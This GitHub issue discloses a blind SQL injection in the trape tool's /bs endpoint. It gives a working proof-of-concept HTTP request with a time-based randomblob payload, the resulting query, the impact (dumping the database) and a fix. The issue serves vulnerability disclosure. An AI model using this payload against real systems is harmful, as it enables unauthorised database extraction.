## Description

![@teeann](https://avatars.githubusercontent.com/u/23275897?u=36edbc5b40b71972b70ec96794d861870abd228a&v=4&size=48)[teeann](https://github.com/teeann)opened [on Jun 14, 2019](https://github.com/jofpin/trape/issues/168#issue-456155102)
## Description

User input is not escaped when building SQL command. As a result, the application is vulnerable to SQL injection attack.

## Proof of concept

1. `python trape.py --url example.com --port 8080`
2. Send the following HTTP request

```
POST /bs HTTP/1.1
Host: <trape_url>
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:67.0) Gecko/20100101 Firefox/67.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Content-Length: 287
Connection: close
Referer: <victim_url>

id=0&t=time_d%20%3D%20case%20when%20(SELECT%20count(tbl_name)%20FROM%20sqlite_master%20WHERE%20type%3D%27table%27%20and%20tbl_name%20NOT%20like%20%27sqlite_%25%27)%20%3D8%20%20then%20randomblob(1000000000)%20else%201%20end%20where%201%3D1%20or%201%3D%3F%20or%20%27a%27%3D%3F%20--&d=0
```

3. The final SQL query is:

```
update victims_battery set time_d = case when (SELECT count(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%') = 8 then randomblob(1000000000) else 1 end where 1=1 or 1=? or 'a'=? --
```

4. If the condition inside `case when()` is true, `randomblob(1000000000)` is executed, which leads to large delay and/or returned status code of 500. This enable attacker to run a blind SQL injection attack.

## Impact

Dump the whole database of `trape`.

## How to fix

The vulnerability is in <https://github.com/jofpin/trape/blob/master/core/db.py#L129>. The `data[2]` variable is manually concatenated to the SQL command.

To fix this, developer can whitelist `data[2]` variable before constructing SQL query.
